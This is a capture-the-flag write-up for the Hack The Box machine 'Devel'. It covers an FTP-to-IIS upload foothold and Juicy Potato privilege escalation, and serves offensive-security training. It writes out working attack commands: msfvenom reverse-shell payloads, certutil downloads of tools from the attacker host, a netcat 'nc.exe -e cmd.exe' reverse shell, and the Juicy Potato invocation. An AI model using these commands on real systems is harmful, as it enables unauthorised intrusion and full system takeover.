# HTB: Devel

***Overview**: Devel is a HTB machine rated as easy on Hackthebox. This machine exploits a file upload in the open FTP server which can be accessed using the web server to gain foothold and then further escalates privileges using the Juicy potato exploit to finally gain system privileges. This juicy potato exploit is possible due to the SeImpersonatePrivilege enabled. Thank you, I really hope you enjoy this writeup*
#### Scanning and Enumeration

- so we start with our port scan for most common ports

```
- we see that we have port 80 open, so we go to the web page and see that it is an IIS server

![](assets/Devel_assets/Pasted%20image%2020230615195201.png)

- we also see that we have FTP open as well, so we can connect to the ftp server, and we will see some files that look like the html document of the IIS server and the image as well

![](assets/Devel_assets/Pasted%20image%2020230615200351.png)

#### Foothold
- we will attempt to put the a file in the FTP server. so we first create the file

![](assets/Devel_assets/Pasted%20image%2020230616064234.png)

- then we place the file in the FTP server using the `get` command

![](assets/Devel_assets/Pasted%20image%2020230616064313.png)

- navigating to the file in our browser, we can see that we can indeed access the file

![](assets/Devel_assets/Pasted%20image%2020230616064330.png)

- so files that a placed in the FTP server are actually in the web server directory
- so we will create a malicious aspx payload using msfvenom
```
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f aspx >reverse.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2867 bytes
```

- then we transfer the aspx file to the FTP server

![](assets/Devel_assets/Pasted%20image%2020230616065029.png)

- so we will also set up our metasploit listener using handler

![](assets/Devel_assets/Pasted%20image%2020230616065212.png)

- after setting up the listener, we can then go to `http://10.10.10.5/reverse.aspx` on our browser and this we will execute the aspx file and we have a meterpreter session open

![](assets/Devel_assets/Pasted%20image%2020230616065159.png)

- so now we can see that we have a meterpreter shell

![](assets/Devel_assets/Pasted%20image%2020230616065234.png)


#### Privilege Escalation

```

- we create new directory `c:\Windows\Temp\scripts` so we can transfer or potato exploit
[https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)

- we can import the file using the command
`certutil.exe -urlcache -split -f http://10.10.14.11/JuicyPotato.exe JuicyPotato.exe`

![](assets/Devel_assets/Pasted%20image%2020230616141953.png)

- we can view the help page of the exploit using the `-h` flag

![](assets/Devel_assets/Pasted%20image%2020230616142022.png)

- so for us to run the exploit we also need a CLSID, we can find some at [https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise), we can try different ones to know which succeeds
- for this exploit we need to import the netcat executable `certutil.exe -urlcache -split -f http://10.10.14.11/nc.exe nc.exe` for the x86 architechture

- For the potato exploit we also have to create a bat file that is a reverse shell using the command `msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.11 LPORT=9003  > priv.bat`

![](assets/Devel_assets/Pasted%20image%2020230616144533.png)

- so we execute the nc first `nc.exe -e cmd.exe 10.10.14.11 9003`
- and we also set up a netcat listener on our attack machine

- we used the first CLSID which is {555F3418-D99E-4E51-800A-6E89CFD8B1D7}, then tried the second {03ca98d6-ff5d-49b8-abc6-03dd84127020} using the full path and we run
`Juicy.Potato.x86.exe -p c:\\Windows\Temp\scripts\priv.bat -l 9999 -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}`

![](assets/Devel_assets/Pasted%20image%2020230616160834.png)

-  then in our netcat listener, we get a shell as system!!

![](assets/Devel_assets/Pasted%20image%2020230616160916.png)

- we can now retrieve our flag

![](assets/Devel_assets/Pasted%20image%2020230616161328.png)

Thank you so much guys for reading my writeup, see you next time!!
